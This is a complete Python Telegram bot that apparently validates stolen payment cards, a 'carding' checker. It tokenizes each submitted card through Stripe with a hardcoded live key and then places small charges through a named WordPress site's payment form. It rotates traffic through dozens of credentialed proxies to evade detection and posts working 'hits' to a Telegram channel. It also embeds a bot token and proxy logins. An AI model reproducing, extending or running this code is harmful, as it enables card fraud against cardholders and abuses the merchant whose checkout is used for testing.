import requests
import json
import random
import telebot
import time
import os
import threading
from concurrent.futures import ThreadPoolExecutor

# ==========================================
# 1. SETUP
# ==========================================
TOKEN = '8265449151:AAHjpNYcSNOPkrdQQVfhnBlLdUtQV-RXjcw'
CHANNEL_ID = "-1003540395323"
bot = telebot.TeleBot(TOKEN)

# GLOBAL STOP FLAG
STOP_PROCESS = False

# ==========================================
# 2. PROXIES LIST
# ==========================================
PROXIES_LIST = [
    "91.124.50.129:49504:CqsW9H8mBtZburi:Z4xkZRHRPtr0bVu", "91.124.50.157:49643:cRKyEi1PrbjgfCm:hpHDnUwgeBwcOpt",
    "91.124.50.179:42076:MhjPa2hdxqAt7OG:2aQV0e7BSguOiXl", "91.124.50.211:48553:D6HBeXusrvxDR40:vYOTA2Op8PVEK1X",
    "91.124.50.25:44393:SRlR3pvABghOpw2:oUNWxRZR0He4tUS", "91.124.50.250:44124:4haQMcyxEozmvgo:Tay1PiT8nE1O8TH",
    "91.124.50.33:44478:zTeKXwp0L4ZB8z9:FXlEnuHOLiBx0fd", "91.124.50.38:49723:OmjhM3IqsdVafTO:nsnxQMKErRWHesl",
    "91.124.50.67:49762:dOEpggOU4kmp8Mp:a9Gjb2nybLlBl69", "91.124.50.96:45406:S0o9S8hcYHtu1Sy:WBnlH3V9ceJAjec",
    "92.113.179.101:46700:ZLSZDLuCDtc8OMC:K1VbeVLHlmhC1Nv", "92.113.179.11:43688:OE92DsHf4nqNIi1:RFY5pBI1OfwJGMa",
    "92.113.179.18:48829:cHZrwo9ggf1csra:HVyzSbY3INcyxTe", "92.113.179.218:44502:8gPzbG78XmfXWgb:6DN8G6IvuKF1tSJ",
    "92.113.179.23:46058:WK3E81VVuzzudsy:dkMHTUxvK4MYhA2", "92.113.179.28:41262:01j39dtQLgmYKbD:Fszr4rngMp67iMl",
    "92.113.179.3:42961:Cwu6awhll94h0fm:yv5nhGGDUyXlAtc", "92.113.179.51:48089:eVlPcqJa9YXE8QV:665JR9PbAMqLSkP",
    "92.113.179.67:41357:ytWfQDHPTKkuTly:ngNH8C2kVSpBoJr", "92.113.179.68:44099:FIfxfu6tnKtTlUN:BIOmCf2X1zviecc",
    "103.115.16.13:41840:hswCiftKaY4fL0H:L9Q4SalH6LnT2Vx", "103.115.16.167:48498:kOhk6A1de666kqP:AyYdvCsejoP7HOW",
    "103.115.16.18:44199:rrWwIj5MgT9ukI8:yC4rjp0JUYJ8YxB", "103.115.16.19:47073:d4dYQ5mKb0LuOML:pgTttCI2qpovryo",
    "103.115.16.212:47743:pGjfEnQEuOSGC18:SuKfXT5lwtWi3Pe", "103.115.16.237:48578:DLg5b40LhKiBG60:V4g2KLu6FN21Sr9",
    "103.115.16.242:46494:WSrFiy2NsO7MeUn:emRd9euYdlcGBPU", "103.115.16.36:47125:AUKh8foujPB80G6:Ch4ighbnIFDR4uo",
    "103.115.16.6:41199:6G6jWDTamIrlVPk:Z8rfErLSkrJrCAt", "103.115.16.83:42357:mujWriEYaYKBI4I:TwELQKYO6rzxCRD",
    "156.232.90.163:49515:BDNbjykf9bP8hLk:ydhZ951Z01Qgj1y", "156.232.90.165:45441:WryWDO2MKongWWc:93TGTXy4RFEZrcb",
    "156.232.90.34:47877:09FjEXDtOpyIEwi:FDuXqXGEwp5Ma0a", "156.232.91.134:47742:iXnUvWCFbZBKZpy:m2Zi2kCSZMJSnp7",
    "156.232.91.175:48065:On9tz4stN7W1O4M:7XLGUWdI5gmVD8m", "156.232.91.18:43173:lnASMlhyveqoUWj:O3kWzgScINUMRrm",
    "156.232.91.210:49573:zjdslGz2Dhi4oym:f4NbtfBmgUvPRDQ", "156.232.91.85:41700:l4NI9gMa7Qb9lpf:ENOKkd7AuwXLbXo",
    "156.232.91.88:47185:74FfJd2dhguz8d5:y3ESMxSMkQpoBZ9", "156.232.91.89:46327:8HSmD7jQJZY2bQQ:kDcpnGrnTLPyCI0",
    "185.100.170.140:47770:qtRHoyvKbzsHal4:w22xwmxXC6VF8El", "185.235.71.129:44430:Oe2TvZy9AffPG9x:kSvRSpCoAwoTPnL",
    "185.235.71.156:47367:sY4S7FVsjgzDaVn:Qv5PkJF8RN4QZFj", "185.235.71.173:45717:7HSTnBGAXzaCf4V:uLrgiR1PYP8a3Um",
    "185.235.71.179:46666:gd6ayMrb28CT1QI:pbaEYmsT8fHEkJt", "185.235.71.193:49337:wc77jJWDt3NlBKI:RoqaByHkYs53yiD",
    "185.235.71.21:45824:E9Br3fVzSgHRXoT:Nk1albzCU853lqM", "185.235.71.217:46956:4PCwvzKlNxQFGyB:BQ2Y3lIl5DxxpBz",
    "185.235.71.48:44564:XAMw3M9ewNiGTJh:x3SfkjfmYDkSISx", "185.235.71.72:42394:BqzhsAgmrUFWZQ3:Nuialg6nh0ivFVG",
    "185.235.71.8:47795:m7VGWi1s1MZvkD6:FKcWldZhe0KLQQO", "185.238.214.151:43363:Ajmh0MSymlbarbZ:47vWpadnBq16sna",
    "193.151.180.6:49646:y74lNS59DbunUxq:Xz9cp24L0U5Bq5G", "46.37.98.10:44171:L3sGliE1DJMNpFW:BXrsevH1trRZXdE",
    "46.37.98.236:42432:TaQXFB12jfk06IQ:BiOaxRVSSPYzp9K", "46.37.98.35:46417:f1vDbwp4Clrp2Q5:KvSnb3W3Qte992h",
    "5.102.104.125:42248:kVV7vDEbC1UbHtb:EYfuNqr0HWYOete", "5.102.105.54:41892:c5dyAyq9x2TqDC0:YUtTf9iUWKRHmiW",
    "5.102.106.244:43529:1M4ucANJ4n1myBy:glPPciJuA6wpRrM", "5.102.107.16:45338:ShJVQi2ebaS4PDp:os32jCCFORO3KCj",
    "5.102.107.34:41705:m1KphDgvYZtyyPK:TnO2O3QXb4kzQAh", "74.122.59.132:41227:49ZsI6Qq6MxafGC:P134z7R4EKXnOd9"
]

# ==========================================
# 3. HELPER FUNCTIONS
# ==========================================
def get_random_proxy():
    proxy = random.choice(PROXIES_LIST)
    ip, port, user, pwd = proxy.split(':')
    return {"http": f"http://{user}:{pwd}@{ip}:{port}", "https": f"http://{user}:{pwd}@{ip}:{port}"}

def get_bin_info(cc_num):
    try:
        bin_number = cc_num[:6]
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if response.status_code == 200:
            res = response.json()
            return f"{res.get('brand','N/A').upper()} - {res.get('type','N/A').upper()}", f"{res.get('country_name','N/A').upper()} {res.get('country_flag','🏳️')}", res.get('bank','N/A').upper()
    except: pass
    return "N/A - N/A", "Unknown 🏳️", "N/A"

def process_card(cc_data):
    global STOP_PROCESS
    if STOP_PROCESS: return None
    try:
        parts = cc_data.strip().split('|')
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 4: yy = yy[2:]
        info_str, country_info, bank_name = get_bin_info(n)
    except: return {"status": "Error", "msg": "Invalid Format", "info": "N/A", "country": "N/A", "bank": "N/A", "card": cc_data}

    session = requests.Session()
    session.proxies = get_random_proxy()
    ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
    
    try:
        # Tokenize
        stripe_res = session.post('https://api.stripe.com/v1/payment_methods', data={
            'type': 'card', 'card[number]': n, 'card[cvc]': cvc, 'card[exp_month]': mm, 'card[exp_year]': yy,
            'key': 'pk_live_51KLmjKDzMnVheZDCWlMej0gCp9fNe6JwjZhXmdduDmbia5wEofDW56jQn0IgaQ7Vr7dCUAkFezBhr4IDt7X3SiB100P8lDyThd'
        }, headers={'user-agent': ua}, timeout=15).json()
        
        if 'id' not in stripe_res:
            return {"status": "Declined ❌", "msg": stripe_res.get('error', {}).get('message', 'Declined'), "info": info_str, "country": country_info, "bank": bank_name, "card": cc_data}

        # Charge
        site_res = session.post('https://www.perhamvillage.co.uk/wp-admin/admin-ajax.php', data={
            'action': 'wp_full_stripe_inline_payment_charge', 'wpfs-form-name': 'PayServiceCharge',
            'wpfs-custom-amount-unique': '1.00', 'wpfs-card-holder-email': f"user{random.randint(1000,9999)}@gmail.com",
            'wpfs-card-holder-name': 'John Doe', 'wpfs-stripe-payment-method-id': stripe_res['id']
        }, headers={'user-agent': ua, 'referer': 'https://www.perhamvillage.co.uk/'}, timeout=15).json()

        msg = site_res.get('message', 'No message')
        low_msg = msg.lower()

        # ==========================================
        # GATEWAY RESPONSE LOGIC
        # ==========================================
        if site_res.get('success'): 
            status = "Approved ✅"
        elif "insufficient" in low_msg: 
            status = "Insufficient Funds 💰"
        elif any(x in low_msg for x in ["security code", "incorrect_cvc", "cvc", "your card does not support for this payment"]): 
            # Added "your card does not support for this payment" here
            status = "CCN ☑️"
        elif "additional action" in low_msg: 
            status = "3DS / LIVE 🛡️"
        else: 
            status = "Declined ❌"
            
        return {"status": status, "msg": msg, "info": info_str, "country": country_info, "bank": bank_name, "card": cc_data}
    except: return {"status": "Error ⚠️", "msg": "Proxy Fail", "info": info_str, "country": country_info, "bank": bank_name, "card": cc_data}

def create_ui(card, status, reason, country, approved, ccn, low, declined, total, current):
    return (f"<b>• CARD:</b> <code>{card}</code>\n<b>• COUNTRY:</b> {country}\n━━━━━━━━━━━━━━\n<b>• STATUS:</b> {status}\n<b>• REASON:</b> {reason}\n━━━━━━━━━━━━━━\n<b>• Approved ✅: [{approved}]</b>\n<b>• CCN ☑️: [{ccn}]</b>\n<b>• Low Funds 💰: [{low}]</b>\n<b>• DECLINED ❌: [{declined}]</b>\n<b>• TOTAL 📊: [{current}/{total}]</b>\n━━━━━━━━━━━━━━")

# ==========================================
# 4. WAKEUP LOGIC (THREADING + THROTTLING)
# ==========================================
def run_checker(m, lines, status_msg):
    global STOP_PROCESS
    total = len(lines)
    app, ccn, low, dec = 0, 0, 0, 0
    
    # 15 Workers for high-spec VPS
    with ThreadPoolExecutor(max_workers=15) as executor:
        for i, res in enumerate(executor.map(process_card, lines), 1):
            if STOP_PROCESS: break
            if not res: continue
            
            if "Approved" in res['status']: app += 1
            elif "CCN" in res['status']: ccn += 1
            elif "Insufficient" in res['status']: low += 1
            else: dec += 1
            
            # WAKE UP FIX: Update UI only every 10 cards to stop freezing
            if i % 10 == 0 or i == total:
                try:
                    bot.edit_message_text(
                        create_ui(res['card'], res['status'], res['msg'], res['country'], app, ccn, low, dec, total, i),
                        m.chat.id, status_msg.message_id, parse_mode="HTML"
                    )
                except: pass 
            
            if any(x in res['status'] for x in ["Approved", "CCN", "Insufficient", "3DS"]):
                hit_text = (f"━━━━━━━━━━━\n<b>[ﾒ] Info ➜ {res['info']}</b>\n<b>[ﾒ] Bank ➜ {res['bank']}</b>\n<b>[ﾒ] Country ➜ {res['country']}</b>\n━━━━━━━━━━━\n<b>[ﾒ] Card ➜ </b><code>{res['card']}</code>\n<b>[ﾒ] Status ➜ {res['status']}</b>\n<b>[ﾒ] Reason ➜ {res['msg']}</b>\n━━━━━━━━━━━\n<b>[ﾒ] Checked By ➜ {m.from_user.first_name}</b>")
                bot.send_message(m.chat.id, hit_text, parse_mode="HTML")
                try: bot.send_message(CHANNEL_ID, hit_text, parse_mode="HTML")
                except: pass

    bot.send_message(m.chat.id, "<b>✅ Check Completed.</b>", parse_mode="HTML")

# ==========================================
# 5. BOT HANDLERS
# ==========================================
@bot.message_handler(commands=['start'])
def start(m): bot.reply_to(m, "<b>Engine Online. Send cards or .txt</b>", parse_mode="HTML")

@bot.message_handler(commands=['stop'])
def stop_process_cmd(m):
    global STOP_PROCESS
    STOP_PROCESS = True
    bot.reply_to(m, "🛑 Stopping...")

@bot.message_handler(content_types=['document', 'text'])
def handle_all(m):
    global STOP_PROCESS
    STOP_PROCESS = False
    lines = []
    if m.content_type == 'document':
        lines = [l.strip() for l in bot.download_file(bot.get_file(m.document.file_id).file_path).decode('utf-8').split('\n') if '|' in l]
    else:
        if m.text.startswith('/'): return
        lines = [l.strip() for l in m.text.split('\n') if '|' in l]
    if not lines: return
    
    status_msg = bot.send_message(m.chat.id, "🔄 Processing...", parse_mode="HTML")
    
    # Run in background thread so bot doesn't freeze
    threading.Thread(target=run_checker, args=(m, lines, status_msg), daemon=True).start()

print("Bot is running with Updated Logic...")
bot.infinity_polling(timeout=60, long_polling_timeout=60)
